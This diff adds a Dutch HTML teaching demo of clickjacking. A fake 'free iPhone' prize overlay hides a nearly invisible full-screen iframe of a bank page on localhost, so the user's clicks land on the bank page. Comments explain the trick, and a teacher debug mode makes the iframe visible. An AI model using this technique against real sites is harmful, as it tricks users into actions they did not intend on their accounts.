@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="nl">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Promotie</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            font-family: system-ui, Arial, sans-serif;
+            background: radial-gradient(circle at top, #ff6a88, #ff3b30);
+            display: grid;
+            place-items: center;
+            overflow: hidden;
+        }
+
+        /* Nepinterface die de gebruiker ziet */
+        .overlay {
+            background: rgba(0, 0, 0, 0.68);
+            color: white;
+            padding: 54px 64px;
+            border-radius: 18px;
+            text-align: center;
+            max-width: 640px;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 30px 70px rgba(0, 0, 0, 0.45);
+        }
+
+        .overlay h1 {
+            font-size: 40px;
+            margin: 0 0 16px;
+        }
+
+        .overlay p {
+            font-size: 18px;
+            line-height: 1.6;
+            margin: 0 0 10px;
+            color: #f1f1f1;
+        }
+
+        .fake-button {
+            margin-top: 26px;
+            padding: 16px 44px;
+            background: #62ff9f;
+            color: #111;
+            font-size: 22px;
+            border-radius: 12px;
+            display: inline-block;
+            font-weight: 800;
+            user-select: none;
+            /* Cruciaal voor clickjacking demo:
+               deze "knop" is niet de echte klik-target */
+            pointer-events: none;
+        }
+
+        .note {
+            margin-top: 16px;
+            font-size: 13px;
+            opacity: 0.85;
+        }
+
+        /*
+        Clickjacking-truc:
+        - iframe ligt bovenaan (z-index: 2)
+        - bijna onzichtbaar (opacity: 0.01)
+        - fullscreen, zodat hij altijd clicks opvangt
+        */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            opacity: 0.01;
+            z-index: 2;
+            pointer-events: auto;
+        }
+
+        /* Docent debug: maak iframe zichtbaar */
+        body.debug iframe {
+            opacity: 0.35;
+            outline: 4px dashed yellow;
+        }
+    </style>
+</head>
+
+<body class="debug">
+    <div class="overlay">
+        <h1>Proficiat!</h1>
+        <p>Je bent geselecteerd voor een exclusieve promotie.</p>
+        <p>Klik hieronder om je gratis iPhone te claimen.</p>
+        <div class="fake-button">CLAIM JE PRIJS</div>
+        <div class="note">(Demo voor clickjacking, alleen voor educatieve
+            doeleinden)</div>
+    </div>
+    <!-- Echte bankpagina in iframe, andere origin -->
+    <iframe src="http://localhost:8080/"></iframe>
+</body>
+
+</html>
